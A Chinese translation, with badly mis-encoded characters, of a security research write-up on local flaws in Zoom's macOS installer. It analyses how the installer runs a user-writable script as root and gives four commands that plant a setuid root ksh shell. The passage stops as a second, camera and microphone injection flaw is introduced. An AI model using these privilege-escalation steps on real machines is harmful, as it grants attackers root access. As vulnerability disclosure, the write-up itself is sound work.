> åŸæ–‡é“¾æ¥: https://www.anquanke.com//post/id/202673 


# macOSç‰ˆæœ¬Zoomæœ€æ–°æœ¬åœ°å®‰å…¨æ¼æ´åˆ†æ


                                é˜…è¯»é‡ Â Â 
                                **537011**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### è¯‘æ–‡å£°æ˜

æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« ï¼Œæ–‡ç« åŸä½œè€…ï¼Œæ–‡ç« æ¥æºï¼šhttps://objective-see.com/blog/blog_0x56.html
                                <br>åŸæ–‡åœ°å€ï¼š[]()

è¯‘æ–‡ä»…ä¾›å‚è€ƒï¼Œå…·ä½“å†…å®¹è¡¨è¾¾ä»¥åŠå«ä¹‰åŸæ–‡ä¸ºå‡†

[![](https://p5.ssl.qhimg.com/t01e8424d88deebe98b.jpg)](https://p5.ssl.qhimg.com/t01e8424d88deebe98b.jpg)

## å‰è¨€

Zoomåœ¨4.6.9 (19273.0402)ç‰ˆæœ¬ä¸­å·²å°†æ¼æ´ä¿®å¤ï¼š<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01a004adc3837c672f.png)<br>
å…³äºè¡¥ä¸çš„æ›´å¤šç»†èŠ‚è¯·ç§»æ­¥ä»¥ä¸‹é“¾æ¥ï¼š<br>[macOSä¸Šçš„æœ€æ–°æ›´æ–°](https://support.zoom.us/hc/en-us/articles/201361963-New-Updates-for-macOS)



## èƒŒæ™¯

ç”±äºå½“å‰å…¨çƒå—ç–«æƒ…å½±å“ä¸¥é‡ï¼Œæ”¿åºœå·²ä¸‹è¾¾ç›¸å…³å°é”æªæ–½ã€‚åœ¨å®¶åŠå…¬æˆä¸ºäº†ä¸»æµçš„å·¥ä½œå½¢å¼ã€‚ä¹Ÿæ­£å› å¦‚æ­¤â€œç°ä»£ä¼ä¸šè§†é¢‘é€šä¿¡çš„é¢†å¯¼è€…â€ Zoomé€æ¸æˆä¸ºå®¶å–»æˆ·æ™“çš„è½¯ä»¶å¹³å°ï¼Œå…¶è‚¡ä»·ä¹Ÿå¼€å§‹ä¸€è·¯é£™å‡ğŸ“ˆã€‚

ç„¶è€Œï¼Œå¦‚æœä½ å¯¹(ç½‘ç»œ)å®‰å…¨æˆ–è€…éšç§æ¯”è¾ƒé‡è§†ï¼Œé‚£ä¹ˆåœ¨ä½¿ç”¨(macOSç‰ˆæœ¬)åº”ç”¨ç¨‹åºæ—¶éœ€å°å¿ƒè°¨æ…ã€‚

åœ¨æœ¬ç¯‡æ–‡ç« ä¸­ï¼Œé¦–å…ˆæˆ‘ä»¬å°†ç®€è¦ä»‹ç»æœ€è¿‘å½±å“Zoomçš„ç›¸å…³å®‰å…¨ã€éšç§æ¼æ´ã€‚è€Œåæˆ‘ä»¬ä¼šè®¨è®ºåœ¨æœ€æ–°ç‰ˆæœ¬çš„Zoom(macOSå®¢æˆ·ç«¯)ä¸­å‘ç°çš„å‡ ä¸ªæ–°çš„å®‰å…¨é—®é¢˜ã€‚

å°½ç®¡æˆ‘ä»¬ä»Šå¤©è¦è®¨è®ºçš„å®‰å…¨é—®é¢˜ä»æœªè§£å†³ï¼ˆæ³¨ï¼šæ–‡ç« å†™ä½œä¹‹æ—¶è¿˜æœªä¿®å¤ï¼Œç°å·²ä¿®å¤ï¼‰ï¼Œä½†å®ƒä»¬éƒ½æ˜¯æœ¬åœ°å®‰å…¨é—®é¢˜ã€‚ä¹Ÿå°±æ˜¯è¯´æ¶æ„è½¯ä»¶æˆ–è€…æ”»å‡»è€…å¦‚æœæƒ³åˆ©ç”¨è¿™äº›æ¼æ´ï¼Œéœ€è¦åœ¨macOSç³»ç»Ÿä¸­å·²ç„¶æˆåŠŸé©»ç•™ã€‚

è™½ç„¶Zoomè½¯ä»¶éå¸¸å—æ¬¢è¿ï¼Œä½†å®ƒåœ¨å®‰å…¨å’Œéšç§æ–¹é¢çš„è¡¨ç°å®åœ¨ä¸å°½å¦‚äººæ„ã€‚

2019å¹´6æœˆï¼Œå®‰å…¨ç ”ç©¶å‘˜[ä¹”çº³æ£®Â·è±åˆ‡å¾·(Jonathan Leitschuh)](https://twitter.com/JLLeitschuh)åœ¨Macä¸Šçš„Zoomå®¢æˆ·ç«¯ä¸­å‘ç°äº†ä¸€ä¸ªå¯åˆ©ç”¨çš„è¿œç¨‹0dayæ¼æ´ï¼Œä½¿å¾—ä»»æ„æ¶æ„ç½‘ç«™èƒ½å¤Ÿåœ¨æœªç»ç”¨æˆ·å…è®¸çš„æƒ…å†µä¸‹å¯åŠ¨ç”¨æˆ·çš„æ‘„åƒå¤´ğŸ˜±ã€‚<br>[![](https://p4.ssl.qhimg.com/t0143a2dc0e8d2d5868.png)](https://p4.ssl.qhimg.com/t0143a2dc0e8d2d5868.png)<br>
å¦‚æœç”¨æˆ·æ‘„åƒå¤´å·²æ‰“å¼€ï¼Œæ¼æ´å…è®¸ä»»æ„ç½‘ç«™åœ¨æœªç»è®¸å¯çš„æƒ…å†µä¸‹å¼ºè¡ŒåŠ å…¥Zoomçš„é€šè¯ä¸­ã€‚æ­¤å¤–ï¼Œåœ¨ä½ å°†Zoomå®¢æˆ·ç«¯å¸è½½åï¼Œæ‚¨çš„æœºå™¨ä¸Šä»ç„¶ä¼šæœ‰ä¸€ä¸ªæœ¬åœ°webæœåŠ¡ï¼Œå®ƒçš„ä½œç”¨æ˜¯åœ¨ä½ è®¿é—®ç½‘é¡µæ—¶é‡æ–°ä¸ºæ‚¨å®‰è£…Zoomå®¢æˆ·ç«¯ä¸”æ— éœ€å…¶ä»–ä»»ä½•äº¤äº’ã€‚è¿™ä¸ªé‡å®‰è£…çš„ç‰¹æ€§ä¿ç•™è‡³ä»Šã€‚-Jonathan Leitschuh

å¦‚æœä½ å¯¹æ­¤è¿˜æƒ³äº†è§£æ›´å¤šç»†èŠ‚ï¼Œè¯·è®¿é—®ä»¥ä¸‹é“¾æ¥ï¼š[â€œZoom Zero Day: 4+ Million Webcams &amp; maybe an RCE?â€](https://medium.com/bugbountywriteup/zoom-zero-day-4-million-webcams-maybe-an-rce-just-get-them-to-visit-your-website-ac75c83f4ef5).

æ›´å¥½ç¬‘çš„æ˜¯Appleå…¬å¸åæ¥é€šè¿‡macOSçš„`Malware Removal Tool` (`MRT`)å·¥å…·å¼ºåˆ¶ç§»é™¤æ‰äº†Zoomä¸­æœ‰é—®é¢˜çš„ç›¸å…³ç»„ä»¶ã€‚[è¯¦æƒ…é“¾æ¥](//twitter.com/patrickwardle/status/1149176886817255424?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1149176886817255424&amp;ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x56.html)

æ®æˆ‘æ‰€çŸ¥ï¼Œè¿™æ˜¯Appleå…¬å¸å”¯ä¸€ä¸€æ¬¡é‡‡å–å¦‚æ­¤ä¸¥å‰çš„è¡ŒåŠ¨ã€‚[è¯¦æƒ…é“¾æ¥](//twitter.com/thomasareed/status/1244710649508302854?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1244710649508302854&amp;ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x56.html)

æœ€è¿‘ï¼ŒZoomé­é‡äº†ç›¸å½“å°´å°¬çš„éšç§æ³„éœ²äº‹ä»¶ï¼Œæœ‰ç ”ç©¶è€…å‘ç°ä»–ä»¬çš„iosç¨‹åºä¼šåœ¨å³ä½¿æ²¡æœ‰Facebookè´¦æˆ·çš„æƒ…å†µä¸‹å‘Facebookå‘é€æ•°æ®ã€‚<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01b1783de8227ab471.png)<br>
å¦‚æœä½ å¯¹æ­¤è¿˜æƒ³äº†è§£æ›´å¤šç»†èŠ‚ï¼Œè¯·è®¿é—®ä»¥ä¸‹é“¾æ¥ï¼š[â€œZoom iOS App Sends Data to Facebook Even if You Donâ€™t Have a Facebook Accountâ€](https://www.vice.com/en_ca/article/k7e599/zoom-ios-app-sends-data-to-facebook-even-if-you-dont-have-a-facebook-account).

å°½ç®¡Zoomè¿…é€Ÿä¿®è¡¥äº†ç›¸å…³æ¼æ´ï¼ˆé€šè¿‡åˆ é™¤å¯¹åº”éƒ¨åˆ†ä»£ç ï¼‰ï¼Œä½†ä»ç„¶æœ‰è®¸å¤šå®‰å…¨ç ”ç©¶è€…æŒ‡å‡ºï¼Œè¿™äº›ä»£ç åŸæœ¬ä¸€å¼€å§‹å°±ä¸åº”è¯¥å‡ºç°åœ¨ç¨‹åºä¸­ã€‚[è¯¦æƒ…é“¾æ¥](//twitter.com/_inside/status/1243702866931601408?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1243702866931601408&amp;ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x56.html)

å¦‚ä»Šï¼Œè‘—åmacOSå®‰å…¨ç ”ç©¶å‘˜[Felix Seele](https://twitter.com/c1truz_)ï¼ˆOBTS v2.0æ¼”è®²è€…ï¼‰æŒ‡å‡ºï¼ŒZoomåœ¨macOSä¸Šçš„å®‰è£…å™¨åœ¨æ‰§è¡Œå®‰è£…ä»»åŠ¡æ—¶ä¸éœ€è¦ç”¨æˆ·çš„ç‚¹å‡»å®‰è£…ã€‚[è¯¦æƒ…é“¾æ¥](//twitter.com/c1truz_/status/1244737672930824193?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1244737672930824193&amp;ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x56.html)

è¿™ç§åšæ³•å¹¶ä¸æ˜¯ä¸¥æ ¼æ„ä¹‰ä¸Šçš„æ¶æ„è¡Œä¸ºï¼Œä½†ä»ç„¶æœ‰å¯¼è‡´å®‰å…¨é—®é¢˜å‘ç”Ÿçš„å¯èƒ½ã€‚å®‰è£…åº”ç”¨ç¨‹åºæ—¶æ²¡æœ‰å¾—åˆ°ç”¨æˆ·çš„æœ€ç»ˆåŒæ„ï¼Œå¹¶ä¸”ä½¿ç”¨ä¸€ä¸ªå…·æœ‰é«˜åº¦è¯¯å¯¼æ€§çš„æç¤ºæ¥è·å¾—rootæƒé™ã€‚è¿™ç§æŠ€å·§åªå‡ºç°åœ¨macOSæ¶æ„è½¯ä»¶èº«ä¸Šã€‚ -Felix Seele

å¦‚æœä½ å¯¹æ­¤è¿˜æƒ³äº†è§£æ›´å¤šç»†èŠ‚ï¼Œè¯·è®¿é—®ä»¥ä¸‹é“¾æ¥ï¼š[â€œGood Apps Behaving Badly: Dissecting Zoomâ€™s macOS installer workaroundâ€](https://www.vmray.com/cyber-security-blog/zoom-macos-installer-analysis-good-apps-behaving-badly/)

Felixæåˆ°çš„å®‰è£…è„šæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡[Suspicious Package](https://mothersruin.com/software/SuspiciousPackage/)ä»Zoomçš„å®‰è£…å™¨åŒ…ä¸­è½»æ˜“åœ°æå–å¹¶æŸ¥çœ‹ï¼š<br>[![](https://p3.ssl.qhimg.com/t013be41981d099c3aa.png)](https://p3.ssl.qhimg.com/t013be41981d099c3aa.png)



## Zoomæœ¬åœ°å®‰å…¨æ¼æ´#1 æƒé™æå‡æ¼æ´

Zoomå…¬å¸åœ¨å®‰å…¨å’Œéšç§æ–¹é¢çš„å¤„ç†è¿˜æœ‰å¾ˆå¤šä¸è¶³ä¹‹å¤„ã€‚å› æ­¤ï¼Œåœ¨Felix Seele[æåˆ°](https://twitter.com/c1truz_/status/1244737675191619584)Zoomå®‰è£…å™¨ä¼šè°ƒç”¨AuthorizationExecuteWithPrivileges APIæ¥æ‰§è¡Œå„ç§ç‰¹æƒå®‰è£…ä»»åŠ¡ä¹‹æ—¶ï¼Œæˆ‘å†³å®šä»”ç»†ç ”ç©¶ä¸€ä¸‹ã€‚å¾ˆå¿«æˆ‘å°±å‘ç°äº†å‡ ä¸ªå®‰å…¨é—®é¢˜ï¼Œå…¶ä¸­åŒ…æ‹¬ä¸€ä¸ªå¯é çš„æœ¬åœ°ç‰¹æƒæå‡æ¼æ´ï¼ˆæå‡è‡³rootæƒé™ï¼‰ã€‚

æˆ‘æ›¾ç»å¤šæ¬¡æåˆ°è¿‡å…³äºAppleå…¬å¸æ˜ç¡®æŒ‡å‡ºä¸åº”è¯¥å†ä½¿ç”¨AuthorizationExecuteWithPrivileges APIçš„é—®é¢˜ã€‚åŸå› å°±æ˜¯æ­¤APIæ²¡æœ‰éªŒè¯å°†è¦æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆä¸”æ˜¯è¦ä»¥rootæƒé™è¿è¡Œï¼‰ã€‚è¿™æ„å‘³ç€æœ¬åœ°æ²¡æœ‰é«˜æƒé™çš„æ”»å‡»è€…æˆ–è€…æ¶æ„è½¯ä»¶å¯ä»¥æš—ä¸­ç¯¡æ”¹ã€æ›¿æ¢å®ƒï¼Œä»è€Œå°†ä»–ä»¬çš„æƒé™å‡çº§åˆ°root:<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0122545f49bca3ee7e.png)<br>
åœ¨DefCon 25æœŸé—´ï¼Œæˆ‘å‘è¡¨è¿‡å…³äºæ­¤è®®é¢˜çš„æ¼”è®²â€œ[Death By 1000 Installers](https://speakerdeck.com/patrickwardle/defcon-2017-death-by-1000-installers-its-all-broken)â€ ã€‚ä»¥åŠç›¸å…³çš„[åšæ–‡](https://www.anquanke.com/post/id/201463)ã€‚

æ­¤å¤–ï¼Œ [Julia Vashchenko](https://twitter.com/iaronskaya)åœ¨ [â€œObjective by the Seaâ€ v3.0](https://objectivebythesea.com/v3/)ä¸Šä¹Ÿåšäº†å…³äºæ­¤ä¸å®‰å…¨APIæ¼”è®²ï¼Œé¢˜ç›®ä¸ºâ€œ[Job(s) Bless Us! Privileged Operations on macOS](https://objectivebythesea.com/v3/talks/OBTS_v3_jVashchenko.pdf)â€œï¼š<br>[![](https://p1.ssl.qhimg.com/t01c85b265c11a1000d.png)](https://p1.ssl.qhimg.com/t01c85b265c11a1000d.png)<br>
åŒæ—¶æ³¨æ„å¦‚æœAuthorizationExecuteWithPrivileges APIæ‰§è¡Œçš„æ˜¯å—ä¿æŠ¤çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆ[SIP](https://en.wikipedia.org/wiki/System_Integrity_Protection)ï¼‰æˆ–è€…åªè¯»ç±»å‹çš„ç¨‹åºï¼ˆè„šæœ¬ï¼‰ï¼Œé‚£ä¹ˆè¿™ä¸ªé—®é¢˜å°†ä¼šè¿åˆƒè€Œè§£ã€‚(åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œéç‰¹æƒä»£ç æ— æ³•å¯¹äºŒè¿›åˆ¶æ–‡ä»¶åšç¯¡æ”¹ã€æ›¿æ¢ç­‰æ“ä½œ)

ç°åœ¨æˆ‘ä»¬æŠŠç›®å…‰æ‹‰å›Zoomæœ¬èº«ï¼Œâ€œä»–ä»¬æ˜¯å¦‚ä½•åˆ©ç”¨è¿™ç§æœ¬è´¨ä¸Šå¹¶ä¸å®‰å…¨çš„APIâ€è¿™ä¸€é—®é¢˜æˆä¸ºé‡ä¸­ä¹‹é‡ã€‚å¦‚æœä»–ä»¬çš„è°ƒç”¨æ–¹å¼å­˜åœ¨ç¼ºé™·ï¼Œé‚£æˆ‘ä»¬å¾ˆå¯èƒ½å°±ä¼šå‘ç°ä¸€ä¸ªæƒé™æå‡æ¼æ´ï¼

æ­£å¦‚æˆ‘åœ¨DefCon[æ¼”è®²](https://speakerdeck.com/patrickwardle/defcon-2017-death-by-1000-installers-its-all-broken)ä¸­è¯´çš„é‚£æ ·ï¼Œå›ç­”è¿™ä¸ªé—®é¢˜æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯è¿è¡Œprocess monitorï¼Œè€Œåæ‰§è¡Œå®‰è£…å™¨åŒ…ï¼ˆæˆ–å…¶ä»–è°ƒç”¨AuthorizationExecuteWithPrivileges APIçš„æ–‡ä»¶ï¼‰ï¼Œå¹¶è§‚å¯Ÿä¼ é€’ç»™security_authtrampolineçš„å‚æ•°(æœ€ç»ˆæ‰§è¡Œç‰¹æƒæ“ä½œçš„setuidç³»ç»ŸäºŒè¿›åˆ¶ç¨‹åº):<br>[![](https://p2.ssl.qhimg.com/t01541a14de5ac58def.png)](https://p2.ssl.qhimg.com/t01541a14de5ac58def.png)<br>
ä¸Šå›¾æ˜¯AuthorizationExecuteWithPrivileges APIåˆå§‹è¿‡ç¨‹çš„æ§åˆ¶æµå›¾ï¼Œå¹¶è¯´æ˜äº†å°†ä½¿ç”¨rootæƒé™æ‰§è¡Œçš„é¡¹(äºŒè¿›åˆ¶ã€è„šæœ¬ã€å‘½ä»¤ç­‰)æ˜¯å¦‚ä½•ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’ç»™security_authtrampolineè¿›ç¨‹çš„ã€‚å¦‚æœè¿™ä¸ªå‚æ•°ï¼Œè¿™ä¸ªé¡¹ï¼Œå¯ä»¥ç”±ä¸€ä¸ªæ— ç‰¹æƒçš„æ”»å‡»è€…ç¼–è¾‘ï¼ˆç¯¡æ”¹ï¼‰ï¼Œé‚£ä¹ˆå°±ä¼šäº§ç”Ÿä¸¥é‡çš„å®‰å…¨é—®é¢˜!

æˆ‘ä»¬æ¥çœ‹ä¸€çœ‹Zoomé€šè¿‡AuthorizationExecuteWithPrivilegesç©¶ç«Ÿæ‰§è¡Œäº†ä»€ä¹ˆï¼Ÿ

é¦–å…ˆï¼Œæˆ‘ä»¬ä»[https://zoom.us/download](https://zoom.us/download) å¤„ä¸‹è½½Zoom macOSç‰ˆæœ¬çš„æœ€æ–°ä¸‹è½½å™¨ï¼ˆVersion 4.6.8 (19178.0323)ï¼‰ï¼š<br>[![](https://p3.ssl.qhimg.com/t01de9d571bb5229f80.png)](https://p3.ssl.qhimg.com/t01de9d571bb5229f80.png)<br>
ç„¶åï¼Œæˆ‘ä»¬å¯åŠ¨æˆ‘ä»¬åœ¨macOSä¸Šçš„è¿›ç¨‹ç›‘æ§å·¥å…·Process Monitorï¼ˆ[https://objective-see.com/products/utilities.html#ProcessMonitor](https://objective-see.com/products/utilities.html#ProcessMonitor))ï¼Œå¹¶å¯åŠ¨Zoomå®‰è£…å™¨åŒ…ï¼ˆZoom.pkgï¼‰ã€‚

å¦‚æœç”¨æˆ·åœ¨æ­£å¸¸æ¨¡å¼ï¼ˆéç®¡ç†å‘˜ï¼‰ä¸‹å®‰è£…Zoomï¼Œå®‰è£…å™¨ä¼šå¼¹å‡ºä»¥ä¸‹çª—å£è¯·æ±‚ç®¡ç†å‘˜å‡­æ®ï¼š<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t013f7fcc5ea935f7f7.png)

æˆ‘ä»¬çš„è¿›ç¨‹ç›‘æ§å·¥å…·ä¼šè§‚å¯Ÿ/usr/libexec/security_authtrampolineçš„å¯åŠ¨ï¼ˆES_EVENT_TYPE_NOTIFY_EXECï¼‰æ¥å¤„ç†æˆæƒè¯·æ±‚ï¼š

```
# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty
`{`
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : `{`
    "uid" : 0,
    "arguments" : [
      "/usr/libexec/security_authtrampoline",
      "./runwithroot",
      "auth 3",
      "/Users/tester/Applications/zoom.us.app",
      "/Applications/zoom.us.app"
    ],
    "ppid" : 1876,
    "ancestors" : [
      1876,
      1823,
      1820,
      1
    ],
    "signing info" : `{`
      "csFlags" : 603996161,
      "signatureIdentifier" : "com.apple.security_authtrampoline",
      "cdHash" : "DC98AF22E29CEC96BB89451933097EAF9E01242",
      "isPlatformBinary" : 1
    `}`,
    "path" : "/usr/libexec/security_authtrampoline",
    "pid" : 1882
  `}`,
  "timestamp" : "2020-03-31 03:18:45 +0000"
`}`
```

è§‚å¯ŸZoomè¯•å›¾ä»¥rootæƒé™å»æ‰§è¡Œä»€ä¹ˆï¼Ÿï¼ˆä¹Ÿå°±æ˜¯ä¼ é€’ç»™security_authtrampolineçš„å‚æ•°æ˜¯ä»€ä¹ˆï¼Ÿï¼‰

å‘ç°æ˜¯ä¸€ä¸ªåä¸ºrunwithrootçš„bashè„šæœ¬ã€‚

å¦‚æœç”¨æˆ·æä¾›äº†æ­£ç¡®çš„å‡­æ®ï¼Œrunwithrootè„šæœ¬ä¾¿ä¼šä»¥rootæƒé™æ‰§è¡Œï¼ˆæ³¨ï¼šuid: 0ï¼‰

```
`{`
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : `{`
    "uid" : 0,
    "arguments" : [
      "/bin/sh",
      "./runwithroot",
      "/Users/tester/Applications/zoom.us.app",
      "/Applications/zoom.us.app"
    ],
    "ppid" : 1876,
    "ancestors" : [
      1876,
      1823,
      1820,
      1
    ],
    "signing info" : `{`
      "csFlags" : 603996161,
      "signatureIdentifier" : "com.apple.sh",
      "cdHash" : "D3308664AA7E12DF271DC78A7AE61F27ADA63BD6",
      "isPlatformBinary" : 1
    `}`,
    "path" : "/bin/sh",
    "pid" : 1882
  `}`,
  "timestamp" : "2020-03-31 03:18:45 +0000"
`}`
```

runwithrootè„šæœ¬çš„å†…å®¹æ— å…³ç´§è¦ã€‚é‡è¦çš„æ˜¯ï¼Œæœ¬åœ°æ— ç‰¹æƒçš„æ”»å‡»è€…ï¼ˆæˆ–æ˜¯æ¶æ„è½¯ä»¶ç‰‡æ®µï¼‰å¯ä»¥åœ¨ä»¥rootç”¨æˆ·èº«ä»½æ‰§è¡Œè„šæœ¬ä¹‹å‰ä¿®æ”¹è¯¥è„šæœ¬å—ï¼Ÿï¼ˆå†æ¬¡æé†’ï¼ŒAuthorizationExecuteWithPrivileges APIä¸ä¼šéªŒè¯æ­£åœ¨æ‰§è¡Œçš„å†…å®¹ï¼‰

ç­”æ¡ˆæ˜¯æ˜¾è€Œæ˜“è§çš„ï¼šæ˜¯å¯ä»¥ä¿®æ”¹çš„ã€‚

æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€ä¸ªäº‹å®æ¥ç¡®è®¤è¿™ä¸€ç‚¹ã€‚é‚£å°±æ˜¯åœ¨å®‰è£…è¿‡ç¨‹ä¸­æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°macOSå®‰è£…ç¨‹åºï¼ˆå¤„ç†.pkgsï¼‰ä¼šå°†runwithrootè„šæœ¬å¤åˆ¶åˆ°ç”¨æˆ·å¯å†™çš„ä¸´æ—¶ç›®å½•ä¸­ï¼š

```
tester@users-Mac T % pwd      
/private/var/folders/v5/s530008n11dbm2n2pgzxkk700000gp/T
tester@users-Mac T % ls -lart com.apple.install.v43Mcm4r
total 27224
-rwxr-xr-x   1 tester  staff     70896 Mar 23 02:25 zoomAutenticationTool
-rw-r--r--   1 tester  staff       513 Mar 23 02:25 zoom.entitlements
-rw-r--r--   1 tester  staff  12008512 Mar 23 02:25 zm.7z
-rwxr-xr-x   1 tester  staff       448 Mar 23 02:25 runwithroot
...
```

çœ‹ä¸Šå»æˆ‘ä»¬åº”è¯¥å¯ä»¥è·å–åˆ°rootæƒé™~

å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œåˆ©ç”¨è¿™ç§ç±»å‹çš„æ¼æ´è·å–æƒé™çš„åšæ³•æ˜¯ååˆ†å¯é çš„ï¼ˆå°½ç®¡éœ€è¦ä¸€äº›è€å¿ƒï¼Œå› ä¸ºæ‚¨å¿…é¡»ç­‰å¾…å®‰è£…ç¨‹åºæˆ–æ›´æ–°ç¨‹åºçš„è¿è¡Œï¼ï¼‰ï¼š<br>[![](https://p3.ssl.qhimg.com/t0132486023fbc8914f.png)](https://p3.ssl.qhimg.com/t0132486023fbc8914f.png)<br>
ä¸ºäº†åˆ©ç”¨Zoomçš„è¿™ä¸€æ¼æ´ï¼Œæœ¬åœ°éç‰¹æƒæ”»å‡»è€…å¯ä»¥åœ¨å®‰è£…ï¼ˆæˆ–å‡çº§ï¼‰æœŸé—´ç®€å•åœ°æ›¿æ¢æˆ–ä¿®æ”¹runwithrootè„šæœ¬æ¥è·å¾—rootç”¨æˆ·è®¿é—®æƒé™ã€‚

ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥å‘runwithrootè„šæœ¬ä¸­æ·»åŠ ä»¥ä¸‹å‘½ä»¤æ¥å¼¹root shellï¼š

```
1 cp /bin/ksh /tmp
2 chown root:wheel /tmp/ksh
3 chmod u+s /tmp/ksh
4 open /tmp/ksh
```

æ•ˆæœå›¾å¦‚ä¸‹ï¼š<br>[![](https://p1.ssl.qhimg.com/t010e6d6ea38941cd8c.png)](https://p1.ssl.qhimg.com/t010e6d6ea38941cd8c.png)

## Zoomæœ¬åœ°å®‰å…¨æ¼æ´#2 è·å–éº¦å…‹é£ä¸æ‘„åƒå¤´æƒé™çš„ä»£ç æ³¨å…¥

Zoomè½¯ä»¶çš„ä½¿ç”¨æ¯‹åº¸ç½®ç–‘éœ€è¦ç³»ç»Ÿéº¦å…‹é£ä¸æ‘„åƒå¤´çš„æƒé™ã€‚

åœ¨æœ€æ–°ç‰ˆæœ¬çš„macOSä¸Šï¼Œè¿™ç§æƒé™çš„ç”³è¯·éœ€è¦æ˜ç¡®çš„ç”¨æˆ·æ‰¹å‡†ã€‚ï¼ˆä»å®‰å…¨ä¸éšç§çš„è§’åº¦æ¥çœ‹æ˜¯ä¸€ä»¶å¥½äº‹ï¼‰ï¼š<br>[![](https://p5.ssl.qhimg.com/t013dfa25971de14347.png)](https://p5.ssl.qhimg.com/t013dfa25971de14347.png)<br>
ç„¶è€Œï¼ŒZoomå¯¹æ­¤å…·æœ‰ï¼ˆå‡ºäºæˆ‘æ‰€ä¸çŸ¥é“çš„åŸå› ï¼‰ç‰¹æ®Šçš„â€œæ’é™¤é¡¹â€ï¼Œè¯¥â€œæ’é™¤é¡¹â€å…è®¸æ”»å‡»è€…å°†æ¶æ„ä»£ç æ³¨å…¥å…¶è¿›ç¨‹ç©ºé—´ä¸­ï¼Œä½¿æ¶æ„ä»£ç æ‹¥æœ‰äº†Zoomçš„ï¼ˆéº¦å…‹é£å’Œæ‘„åƒå¤´ï¼‰è®¿é—®æƒé™ï¼è¿™ç»™æ”»å‡»è€…æä¾›äº†ä¸€ç§è®°å½•å—å®³è€…Zoomä¼šè®®çš„æ–¹æ³•ï¼Œæ›´ç³Ÿç³•çš„æ˜¯ï¼Œå®ƒç”šè‡³å¯ä»¥åœ¨ä»»æ„æ—¶é—´ï¼ˆæ²¡æœ‰ç”¨æˆ·è®¿é—®æç¤ºï¼‰è®¿é—®éº¦å…‹é£å’Œæ‘„åƒå¤´ï¼

ç°ä»£macOSç¨‹åºåœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­å¼•å…¥äº†ä¸€ä¸ªå«åš[Hardened Runtime](https://developer.apple.com/documentation/security/hardened_runtime)çš„ç‰¹æ€§ã€‚Appleå®˜æ–¹å¯¹è¿™ä¸€å¢å¼ºå®‰å…¨çš„ç‰¹æ€§æè¿°å¦‚ä¸‹ï¼š

**Hardened Runtime**ä¸ç³»ç»Ÿå®Œæ•´æ€§ä¿æŠ¤(System Integrity Protection, SIP)ä¸€èµ·ï¼Œé€šè¿‡é˜²æ­¢æŸäº›ç±»å‹çš„æ¼æ´(å¦‚ä»£ç æ³¨å…¥ã€åŠ¨æ€é“¾æ¥åº“(DLL)åŠ«æŒå’Œè¿›ç¨‹å†…å­˜ç©ºé—´ç¯¡æ”¹)æ¥ä¿æŠ¤è½¯ä»¶è¿è¡Œæ—¶çš„å®Œæ•´æ€§ã€‚

